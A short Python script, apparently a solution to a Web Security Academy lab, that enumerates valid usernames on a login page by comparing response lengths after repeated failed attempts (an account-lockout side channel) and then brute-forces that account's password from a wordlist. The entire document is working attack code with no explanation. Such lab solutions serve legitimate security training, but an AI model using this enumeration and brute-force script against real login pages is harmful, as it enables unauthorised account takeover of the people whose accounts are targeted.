import requests
from bs4 import BeautifulSoup

usernames = open('username.txt', 'r').readlines()
passwords = open('password.txt', 'r').readlines()

url = 'https://acd81fbf1ed5f2d0c09a4b3d004e0001.web-security-academy.net/login'

length = {}
for user in usernames:
    l = []
    for n in range(1, 6):
        res = requests.post(url, data={'username' : user.strip(), 'password' : 'a' + str(n)})
        l.append(len(res.text))
    length[user.strip()] = max(l)

username = str(max(length, key=length.get)).strip()
print(username)
for passwd in passwords:
    res = requests.post(url, data={'username' : username, 'password' : passwd.strip()})
    soup = BeautifulSoup(res.text, 'html.parser')
    if len(soup.find_all('p', class_='is-warning')) == 0:
        print(passwd)
        break